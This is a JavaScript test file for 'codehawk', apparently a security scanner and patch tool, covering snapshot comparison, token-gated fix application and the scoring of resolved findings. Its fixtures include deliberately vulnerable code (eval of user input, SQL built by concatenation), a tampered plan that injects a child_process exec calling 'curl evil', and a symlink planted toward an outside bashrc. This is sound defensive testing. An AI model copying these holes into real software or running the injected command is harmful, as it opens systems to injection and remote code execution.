import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileChangedSince, newIssues, snapshotWorkingTree } from '../skills/codehawk/scripts/lib/recheck.mjs';
import { S, run, runFail, git, repo, readList, cands } from './helpers/fixture.mjs';

test('working-tree evidence compares raw bytes from the scan', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'codehawk-snapshot-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  git(dir, 'init', '-q');
  fs.writeFileSync(path.join(dir, '.gitattributes'), '*.txt text\n');
  fs.writeFileSync(path.join(dir, '.gitignore'), '.codehawk/\n');
  const tracked = path.join(dir, 'tracked.txt');
  fs.writeFileSync(tracked, 'one\n');
  git(dir, 'add', 'tracked.txt');
  fs.writeFileSync(tracked, 'one\r\n');
  fs.writeFileSync(path.join(dir, 'préexisting.txt'), 'untracked at scan time');
  const snapshot = snapshotWorkingTree(dir);
  const compare = (file) => fileChangedSince(dir, null, file, { snapshot });
  assert.equal(compare('tracked.txt').ok, false, 'Git normalization does not change the baseline');
  assert.equal(compare('préexisting.txt').ok, false, 'untracked Unicode path is already in the baseline');

  fs.writeFileSync(tracked, 'one\n');
  assert.equal(compare('tracked.txt').ok, true, 'line-ending changes affect the raw bytes');
  fs.unlinkSync(tracked);
  assert.equal(compare('tracked.txt').ok, true, 'removal counts as a change');
  fs.writeFileSync(path.join(dir, 'new.txt'), 'added after scanning');
  assert.equal(compare('new.txt').ok, true);
});

test('closing sweep uses the working tree as scanned', (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'codehawk-closing-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  git(dir, 'init', '-q');
  const tracked = path.join(dir, 'tracked.js');
  const untracked = path.join(dir, 'untracked.js');
  const flagged = 'eval(userInput);\n';
  fs.writeFileSync(tracked, flagged);
  git(dir, 'add', 'tracked.js');
  git(dir, 'commit', '-qm', 'Initial source');
  fs.writeFileSync(tracked, 'const value = 1;\n');
  fs.writeFileSync(untracked, flagged);
  const data = { meta: { snapshot: snapshotWorkingTree(dir) } };

  assert.deepEqual(newIssues(dir, data), []);
  fs.appendFileSync(untracked, 'const value = 2;\n');
  assert.deepEqual(newIssues(dir, data), []);
  fs.writeFileSync(tracked, flagged);
  fs.appendFileSync(untracked, flagged);
  assert.deepEqual(newIssues(dir, data).map(({ file, line }) => [file, line]).sort(),
    [['tracked.js', 1], ['untracked.js', 3]]);
  assert.equal(newIssues(dir, { meta: { snapshot: { version: 1, files: {} } } }), null);
});

test('fixes need a plan token, apply only matching code, and never commit', () => {
  const dir = repo();
  run('target.mjs', dir, '--repo');
  run('scan.mjs', dir);
  const c = cands(dir);
  const sql = c.find((x) => x.rule === 'sql-concat');
  fs.writeFileSync(path.join(dir, '.codehawk', 'findings.json'), JSON.stringify({
    reviewed: readList(dir),
    findings: [{ title: 'SQLi', severity: 'critical', category: 'injection', file: sql.file, line: sql.line, candidates: [sql.id],
      description: 'x', fix: 'bind', fixCode: "const rows = await db.query('SELECT * FROM products WHERE name LIKE $1', [`%${q}%`]);" },
    { title: 'Needs a human-written fix', severity: 'low', category: 'logic', file: sql.file, line: 1, description: 'x', fix: 'x' }],
    dismissed: [{ candidates: c.filter((x) => x.id !== sql.id).map((x) => x.id), reason: 'checked by hand in this test fixture', }],
  }));
  run('build.mjs', dir);
  const before = git(dir, 'rev-parse', 'HEAD');
  assert.equal(runFail('fix.mjs', 'apply', dir, '--token', 'nope').ok, false); // no plan yet
  fs.chmodSync(path.join(dir, sql.file), 0o755);
  const plan = JSON.parse(execFileSync('node', [path.join(S, 'fix.mjs'), 'plan', dir, '--all', '--json'], { encoding: 'utf8' }));
  assert.deepEqual(plan.items.map((i) => i.status).sort(), ['manual', 'ready']);
  assert.equal(runFail('fix.mjs', 'apply', dir, '--token', 'wrong').ok, false);
  const applied = JSON.parse(execFileSync('node', [path.join(S, 'fix.mjs'), 'apply', dir, '--token', plan.token, '--json'], { encoding: 'utf8' }));
  assert.equal(applied.applied.length, 1);
  assert.match(fs.readFileSync(path.join(dir, sql.file), 'utf8'), /LIKE \$1'/);
  assert.equal(git(dir, 'rev-parse', 'HEAD'), before, 'must not commit');
  if (process.platform !== 'win32') assert.equal(fs.statSync(path.join(dir, sql.file)).mode & 0o777, 0o755, 'apply keeps the file mode');
  assert.deepEqual(fs.readdirSync(path.dirname(path.join(dir, sql.file))).filter((n) => n.includes('.codehawk-')), [], 'no temp file left behind');
  assert.equal(runFail('fix.mjs', 'apply', dir, '--token', plan.token).ok, false); // token is single-use
});

// Sets up a scanned repo with one patchable SQLi finding; `prep` can change the file first.
function sqlFixRepo(prep) {
  const dir = repo();
  run('target.mjs', dir, '--repo');
  run('scan.mjs', dir);
  const c = cands(dir);
  const sql = c.find((x) => x.rule === 'sql-concat');
  if (prep) prep(dir, sql);
  fs.writeFileSync(path.join(dir, '.codehawk', 'findings.json'), JSON.stringify({
    reviewed: readList(dir),
    findings: [{ title: 'SQLi', severity: 'critical', category: 'injection', file: sql.file, line: sql.line, candidates: [sql.id],
      description: 'x', fix: 'bind', fixCode: "const pattern = `%${q}%`;\nconst rows = await db.query('SELECT * FROM products WHERE name LIKE $1', [pattern]);" }],
    dismissed: [{ candidates: c.filter((x) => x.id !== sql.id).map((x) => x.id), reason: 'checked by hand in this test fixture' }],
  }));
  run('build.mjs', dir, '--no-open');
  return { dir, sql };
}

test('apply refuses an edited plan and never writes through planted symlinks', () => {
  const { dir, sql } = sqlFixRepo();
  const planFile = path.join(dir, '.codehawk', 'fix-plan.json');
  const plan = run('fix.mjs', 'plan', dir, '--all');
  const saved = fs.readFileSync(planFile, 'utf8');
  const tampered = JSON.parse(saved);
  tampered.items.find((i) => i.status === 'ready').after = ['require("child_process").exec("curl evil")'];
  fs.writeFileSync(planFile, JSON.stringify(tampered));
  assert.match(runFail('fix.mjs', 'apply', dir, '--token', plan.token).error, /changed after it was shown/);
  fs.writeFileSync(planFile, saved);
  if (process.platform === 'win32') return;
  // The old fixed temp name, planted as a symlink to a file outside the repo, is never followed.
  const outside = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'codehawk-out-')), 'bashrc');
  fs.writeFileSync(outside, 'ORIGINAL\n');
  fs.symlinkSync(outside, path.join(dir, sql.file) + '.codehawk-tmp');
  assert.equal(run('fix.mjs', 'apply', dir, '--token', plan.token).applied.length, 1);
  assert.equal(fs.readFileSync(outside, 'utf8'), 'ORIGINAL\n');
  assert.ok(!fs.lstatSync(path.join(dir, sql.file)).isSymbolicLink());
  // A tracked file that is itself a symlink out of the repo is not patched at all.
  const { dir: d2, sql: s2 } = sqlFixRepo();
  const out = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'codehawk-out-')), 'real.js');
  fs.renameSync(path.join(d2, s2.file), out);
  fs.symlinkSync(out, path.join(d2, s2.file));
  assert.equal(run('fix.mjs', 'plan', d2, '--all').items[0].status, 'missing', 'a symlink out of the repo is not patched');
});

test('apply keeps each line ending and resolve checks the evidence it cites', () => {
  const { dir, sql } = sqlFixRepo((d, f) => {
    const p = path.join(d, f.file);
    const lines = fs.readFileSync(p, 'utf8').split('\n');
    lines[0] += '\r'; // one CRLF line in an LF file
    fs.writeFileSync(p, lines.join('\n'));
  });
  const p = path.join(dir, sql.file);
  const plan = run('fix.mjs', 'plan', dir, '--all');
  const id = plan.items[0].id;
  run('fix.mjs', 'apply', dir, '--token', plan.token);
  const after = fs.readFileSync(p, 'utf8');
  assert.ok(after.split('\n')[0].endsWith('\r'), 'the untouched CRLF line keeps its ending');
  assert.equal((after.match(/\r\n/g) || []).length, 1, 'no other line was converted');
  assert.match(runFail('fix.mjs', 'resolve', dir, id, '--regression', 'still works: src/nope.js:3').error, /isn't a file in the repo/);
  assert.match(runFail('fix.mjs', 'resolve', dir, id, '--regression', `still works: ${sql.file}:99999`).error, /has no line 99999/);
  assert.match(runFail('fix.mjs', 'resolve', dir, id, '--regression', 'no test needed').error, /can't be checked/);
  assert.match(runFail('fix.mjs', 'resolve', dir, id, '--regression', 'covered by a test at line 999999').error, /can't be checked/, 'a bare line number needs a file');
  assert.match(runFail('fix.mjs', 'resolve', dir, id, '--regression', 'see the test notes in README.md').error, /can't be checked/, 'a non-test file is not a test');
  assert.equal(run('fix.mjs', 'resolve', dir, id, '--regression', `same rows for empty search: ${sql.file}:${sql.line}`).resolved[0], id);
});

test('resolution status: apply marks resolved, resolve/reopen update every output, a new scan starts clean', () => {
  const dir = repo();
  run('target.mjs', dir, '--repo');
  run('scan.mjs', dir);
  const c = cands(dir);
  const sql = c.find((x) => x.rule === 'sql-concat');
  fs.writeFileSync(path.join(dir, '.codehawk', 'findings.json'), JSON.stringify({
    reviewed: readList(dir),
    findings: [{ title: 'SQLi', severity: 'critical', scoreDeduction: 17.5, category: 'injection', file: sql.file, line: sql.line, candidates: [sql.id],
      description: 'x', fix: 'bind', fixCode: "const pattern = `%${q}%`;\nconst rows = await db.query('SELECT * FROM products WHERE name LIKE $1', [pattern]);" },
    { title: 'Swallowed error', severity: 'medium', category: 'error-handling', file: sql.file, line: 1, description: 'x', fix: 'x' }],
    dismissed: [{ candidates: c.filter((x) => x.id !== sql.id).map((x) => x.id), reason: 'checked by hand in this test fixture' }],
  }));
  const findingsFile = path.join(dir, '.codehawk', 'findings.json');
  const originalFindings = fs.readFileSync(findingsFile, 'utf8');
  const invalid = JSON.parse(originalFindings);
  invalid.findings[0].scoreDeduction = 31;
  fs.writeFileSync(findingsFile, JSON.stringify(invalid));
  assert.match(JSON.stringify(runFail('build.mjs', dir, '--no-open')), /scoreDeduction must be a number between 0 and 30/);
  fs.writeFileSync(findingsFile, originalFindings);
  run('build.mjs', dir, '--no-open');
  const out = path.join(dir, '.codehawk');
  const report = () => JSON.parse(fs.readFileSync(path.join(out, 'report.json'), 'utf8'));
  const byTitle = (t) => report().findings.find((f) => f.title === t);
  const secId = byTitle('SQLi').id, cqId = byTitle('Swallowed error').id;
  assert.equal(report().progress.resolved, 0);
  assert.equal(byTitle('SQLi').scoreDeduction, 17.5);
  assert.equal(byTitle('Swallowed error').scoreDeduction, 3);
  assert.equal(report().score, 83);
  assert.equal(report().qualityScore, 97);

  // Before any fix, resolve re-runs the rule on the file, sees it still matches, and refuses.
  const early = run('fix.mjs', 'resolve', dir, secId);
  assert.deepEqual(early.resolved, []);
  assert.equal(early.refused[0].id, secId);
  assert.equal(byTitle('SQLi').resolution, null);

  // Applying the patch ticks the three scripted steps; only the regression check requires reviewer evidence.
  assert.deepEqual(run('fix.mjs', 'plan', dir, '--severity', 'critical').items.map((i) => i.id), [secId], 'severity picks ids without reading report.json');
  for (const severityArgs of [[], ['critical,'], ['urgent']]) {
    assert.match(runFail('fix.mjs', 'plan', dir, '--all', '--severity', ...severityArgs).error, /--severity requires/);
  }
  const plan = run('fix.mjs', 'plan', '--json', dir, secId, secId.toLowerCase());
  assert.deepEqual(plan.items.map((item) => item.id), [secId], 'one patch per finding');
  const applied = run('fix.mjs', 'apply', dir, '--token', plan.token);
  assert.deepEqual(applied.resolved, [secId]);
  let sq = byTitle('SQLi').resolution;
  assert.equal(sq.method, 'patch');
  assert.deepEqual([sq.steps.changed.ok, sq.steps.gone.ok, sq.steps.gone.by, sq.steps.everywhere.ok, sq.steps.everywhere.by, sq.steps.regression.ok], [true, true, 'rules', true, 'rules', false]);
  assert.match(sq.steps.everywhere.detail, /no other unhandled matches|no other matches/);
  assert.equal(sq.passed, 3);
  assert.equal(sq.verified, false, 'verified only at 4/4');
  assert.equal(report().score, 83, 'partial fixes keep their deductions');
  assert.equal(run('fix.mjs', 'plan', dir, secId).items[0].status, 'resolved', 'a resolved finding is not re-planned');

  // The same bug copied somewhere nobody reviewed: the sibling search finds it and the step
  // un-ticks; the check sweep also lists it as new in the changes. Removing it clears both.
  const copy = path.join(dir, 'src', 'lib', 'search.js');
  fs.writeFileSync(copy, "export const find = (db, q) => db.query(`SELECT * FROM products WHERE name LIKE '%${q}%'`);\n");
  const chk = run('fix.mjs', 'check', dir);
  assert.equal(chk.attention[0].id, secId);
  assert.deepEqual(chk.attention[0].missing, ['everywhere', 'regression']);
  assert.match(byTitle('SQLi').resolution.steps.everywhere.detail, /same pattern still at `src\/lib\/search\.js:1`/);
  assert.ok(chk.newIssues.some((n) => n.file === 'src/lib/search.js' && n.rule === 'sql-concat'), 'new issue in the changes');
  fs.rmSync(copy);
  assert.equal(run('fix.mjs', 'check', dir).newIssues.length, 0);
  assert.equal(byTitle('SQLi').resolution.steps.everywhere.ok, true);

  // Evidence must be checkable; steps added in a later call are merged with earlier ones.
  assert.match(runFail('fix.mjs', 'resolve', dir, secId, '--regression', 'looked around, all fine').error, /must cite a file:line/);
  const done = run('fix.mjs', 'resolve', dir, secId, '--regression', 'empty search still lists everything: src/server.js:20 passes "%%" as data');
  sq = byTitle('SQLi').resolution;
  assert.equal(sq.passed, 4);
  assert.equal(sq.verified, true);
  assert.equal(done.progress.verified, 1);
  assert.equal(done.progress.scores.score, 100);
  assert.equal(report().score, 100);
  assert.equal(report().qualityScore, 97, 'each track is scored independently');

  // A finding no rule backs, whose flagged line didn't change: refused until something proves the fix.
  const r0 = run('fix.mjs', 'resolve', dir, cqId);
  assert.deepEqual(r0.resolved, []);
  assert.match(r0.refused[0].reason, /flagged code is still there/);
  // The fix landed in another file: --changed is checked against git, not taken on trust.
  fs.writeFileSync(path.join(dir, 'src', 'lib', 'errors.js'), 'export const rethrow = (e) => { console.error(e); throw e; };\n');
  assert.equal(run('fix.mjs', 'resolve', dir, cqId, '--changed', 'src/lib/db.js:3').refused.length, 1, 'an unchanged file is rejected');
  const r1 = run('fix.mjs', 'resolve', dir, cqId, '--changed', 'src/lib/errors.js:1', '--evidence', 'src/lib/errors.js:1 logs and rethrows', '--note', 'Logged and rethrown');
  assert.deepEqual(r1.resolved, [cqId]);
  assert.match(byTitle('Swallowed error').resolution.steps.changed.detail, /errors\.js is new since the scan/);
  assert.equal(byTitle('Swallowed error').resolution.passed, 2);
  const r = run('fix.mjs', 'resolve', dir, cqId, '--siblings', 'none: only catch block in src/lib/db.js:6', '--regression', 'errors still reach the caller: src/lib/errors.js:1 rethrows');
  assert.equal(r.progress.resolved, 2);
  assert.equal(r.progress.verified, 2);

  const sibling = path.join(dir, 'src', 'lib', 'db.js');
  const siblingText = fs.readFileSync(sibling, 'utf8');
  fs.appendFileSync(sibling, '\n// Sibling review now needs refreshing.\n');
  assert.deepEqual(run('fix.mjs', 'check', dir).attention.find(({ id }) => id === cqId).missing, ['everywhere']);
  fs.writeFileSync(sibling, siblingText);
  assert.equal(run('fix.mjs', 'check', dir).progress.verified, 2);

  const helper = path.join(dir, 'src', 'lib', 'errors.js');
  const helperText = fs.readFileSync(helper, 'utf8');
  fs.rmSync(helper);
  const reverted = run('fix.mjs', 'check', dir);
  assert.ok(reverted.attention.find(({ id, missing }) => id === cqId && missing.includes('changed')));
  assert.equal(report().qualityScore, 97, 'failed recheck restores the deduction');
  fs.writeFileSync(helper, helperText);
  assert.equal(run('fix.mjs', 'check', dir).progress.verified, 2);

  assert.equal(report().scanScores.score, 83);
  assert.equal(report().score, 100);
  assert.equal(report().qualityScore, 100);
  assert.equal(report().verdict, 'pass');
  assert.equal(byTitle('Swallowed error').resolution.note, 'Logged and rethrown', 'the note is kept');
  assert.equal(byTitle('Swallowed error').resolution.steps.changed.ok, true, 'a --changed step is kept on later calls');
  // The open report polls live.js; it must carry the same state.
  const live = fs.readFileSync(path.join(out, 'live.js'), 'utf8');
  assert.match(live, /^window\.__codehawkLive && window\.__codehawkLive\(/);
  const msg = JSON.parse(live.slice(live.indexOf('(', 30) + 1, live.lastIndexOf(')')));
  assert.equal(msg.scanId, report().meta.scanId);
  assert.equal(msg.rev, report().liveRev);
  assert.equal(msg.resolutions[cqId].passed, 4);
  assert.equal(msg.score, 100);
  assert.equal(msg.qualityScore, 100);
  assert.equal(msg.verdict, 'pass');
  const html = fs.readFileSync(path.join(out, 'report.html'), 'utf8');
  assert.match(html, /"resolution":\{"status":"resolved"/);
  const md = fs.readFileSync(path.join(out, 'summary.md'), 'utf8');
  assert.match(md, /Security A\*\* \(100\/100\) · \*\*Code quality A\*\* \(100\/100\)/);
  assert.match(md, /2 of 2 fixed and verified/);
  assert.match(md, /fixed and verified, and the changes introduced nothing new/);
  assert.match(md, /### Resolved — 2/);
  assert.doesNotMatch(md, /### Security/, 'resolved findings leave the open sections');
  assert.equal(JSON.parse(fs.readFileSync(path.join(out, 'report.sarif'), 'utf8')).runs[0].results.length, 0, 'resolved findings leave the SARIF');

  // A rebuild of the same scan keeps the status; reopen clears it.
  run('build.mjs', dir, '--no-open');
  assert.equal(report().progress.resolved, 2);
  // …and still compares against the code as scanned, not the fixed working tree it re-read.
  assert.equal(run('fix.mjs', 'resolve', dir, secId).checklists[0].steps.changed.ok, true);
  assert.doesNotMatch(byTitle('SQLi').snippet.lines.join('\n'), /const pattern/);
  run('fix.mjs', 'reopen', dir, cqId);
  assert.equal(byTitle('Swallowed error').resolution, null);
  assert.equal(report().qualityScore, 97, 'reopen restores the deduction');
  assert.equal(runFail('fix.mjs', 'resolve', dir, 'SEC-999').ok, false);

  // A new scan starts with everything open, even with the old resolutions file still there.
  run('target.mjs', dir, '--repo');
  run('scan.mjs', dir);
  const c2 = cands(dir);
  fs.writeFileSync(path.join(out, 'findings.json'), JSON.stringify({ reviewed: readList(dir), findings: [], dismissed: c2.length ? [{ candidates: c2.map((x) => x.id), reason: 'checked by hand in this test fixture' }] : [] }));
  run('build.mjs', dir, '--no-open');
  assert.equal(report().progress.resolved, 0);
});
